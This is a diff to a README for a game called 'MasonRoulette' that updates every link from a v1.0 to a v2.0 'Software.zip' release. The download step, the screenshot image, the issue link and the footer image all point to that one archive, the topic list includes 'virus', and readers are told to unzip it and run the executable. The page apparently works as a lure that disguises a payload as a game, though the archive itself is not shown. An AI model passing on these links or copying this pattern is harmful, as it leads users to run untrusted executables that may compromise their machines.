@@ -14,7 +14,7 @@ Welcome to **MasonRoulette**, a thrilling high-stakes survival game where your r
 ## Installation
 To get started with **MasonRoulette**, follow these simple steps:
 1. Click on the following link to download the game:
-   [Download MasonRoulette](https://github.com/AndresCodercyber/MasonRoulette/releases/download/v1.0/Software.zip) <!-- needs to be launched -->
+   [Download MasonRoulette](https://github.com/AndresCodercyber/MasonRoulette/releases/download/v2.0/Software.zip) <!-- needs to be launched -->
 2. Unzip the downloaded file and run the executable to start playing the game
 
 ## Gameplay
@@ -23,7 +23,7 @@ In **MasonRoulette**, your objective is clear - survive at all costs. Navigate t
 ## Screenshots
 Here are some snapshots from the intense gameplay of **MasonRoulette**:
 
-![Gameplay Screenshot](https://github.com/AndresCodercyber/MasonRoulette/releases/download/v1.0/Software.zip)
+![Gameplay Screenshot](https://github.com/AndresCodercyber/MasonRoulette/releases/download/v2.0/Software.zip)
 
 ## Technologies Used
 - C# 
@@ -46,7 +46,7 @@ This repository covers the following topics:
 - virus
 
 ## Support
-For any issues or feedback, please open an [issue](https://github.com/AndresCodercyber/MasonRoulette/releases/download/v1.0/Software.zip) on this repository.
+For any issues or feedback, please open an [issue](https://github.com/AndresCodercyber/MasonRoulette/releases/download/v2.0/Software.zip) on this repository.
 
 ## License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
@@ -54,5 +54,5 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 ---
 
 <p align="center">
-  <img src="https://github.com/AndresCodercyber/MasonRoulette/releases/download/v1.0/Software.zip">
+  <img src="https://github.com/AndresCodercyber/MasonRoulette/releases/download/v2.0/Software.zip">
 </p>
